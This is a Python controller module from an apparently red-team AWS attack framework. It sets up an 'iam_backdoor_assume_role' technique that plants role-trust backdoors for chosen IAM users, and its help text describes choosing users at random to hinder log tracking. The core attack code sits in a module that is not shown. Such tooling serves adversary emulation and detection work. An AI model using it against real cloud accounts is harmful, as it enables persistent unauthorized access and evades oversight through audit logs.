#!/usr/bin/env python3
#'description': ''This module creates a trust relationship between 
#one or more user accounts and one or more roles in the account, allowing those users to assume those roles.',

import datetime
import argparse
import json
from random import choice
import importlib
from botocore.exceptions import ClientError

target = ''

technique_info = {
    'blackbot_id': 'T1484.b.001',
    'external_id': '',
    'controller': 'iam_backdoor_assume_role',
    'services': ['IAM'],
    'prerequisite_modules': ['iam_enum_roles'],
    'arguments_to_autocomplete': ['--role-names', '--user-arns', '--no-random'],
    'version': '1',
    'aws_namespaces': [],
    'last_updated_by': 'Blackbot, Inc. Sun Sep 20 04:13:33 UTC 2020' ,
    'ttp_exec': '',
    'ttp_mitigation': '',
    'ttp_detection': '',
    'name': 'Group Policy Modification: Modify & Assume Roles' ,
    'intent': 'Adversaries attempt to modify & assume-role trust relationships between users and roles.',

}


parser = argparse.ArgumentParser(add_help=False, description=technique_info['name'])

parser.add_argument('--role-names', required=False, default=None, help='A comma-separated list of role names from the AWS account that trust relationships should be created with. Defaults to all roles.')
parser.add_argument('--user-arns', required=False, default=None, help='A comma-separated list of user ARNs that the trust relationship with roles should be created with. By default, user ARNs in this list are chosen at random for each role to try and prevent the tracking of the logs all back to one user account. Without this argument, the module will default to the current user.')
parser.add_argument('--no-random', required=False, action='store_true', help='If this argument is supplied in addition to a list of user ARNs, a trust relationship is created for each user in the list with each role, rather than one of them at random.')


def main(args, awsattack_main):
    args = parser.parse_args(args)

    import_path = 'ttp.src.iam_backdoor_assume_role_src'
    src_code = __import__(import_path, globals(), locals(), ['technique_info'], 0)
    importlib.reload(src_code)

    awsattack_main.chain = True
    return src_code.main(args, awsattack_main, data=technique_info)

def summary(data, awsattack_main):
    out = ''
    if 'RoleCount' in data:
        out += '  {} Role(s) successfully backdoored\n'.format(data['RoleCount'])
    return out

